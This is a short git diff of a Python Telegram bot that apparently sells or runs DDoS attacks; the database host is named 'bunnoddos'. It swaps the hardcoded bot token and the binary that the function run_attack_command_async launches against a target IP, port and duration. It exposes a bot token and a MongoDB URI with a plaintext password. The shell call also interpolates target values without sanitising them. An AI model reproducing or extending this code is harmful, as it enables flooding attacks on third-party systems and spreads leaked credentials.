@@ -17,7 +17,7 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7056532346:AAEztytEfH48AUKuYj69KcSUer4woN5VWrs'
+TOKEN = '7056532346:AAGy2ePypmSXlHKRX0DH6mTxoMM8CCR8iiY'
 #mongodb+srv://bunno:<db_password>@bunnoddos.irajc.mongodb.net/
 MONGO_URI = 'mongodb+srv://bunno1:DhvFvhVFkr2uBtxd@bunnoddos.irajc.mongodb.net/'
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
@@ -102,7 +102,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./bunno {target_ip} {target_port} {duration} 25")
+    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 25")
     await process.communicate()
 
 def is_user_admin(user_id, chat_id):
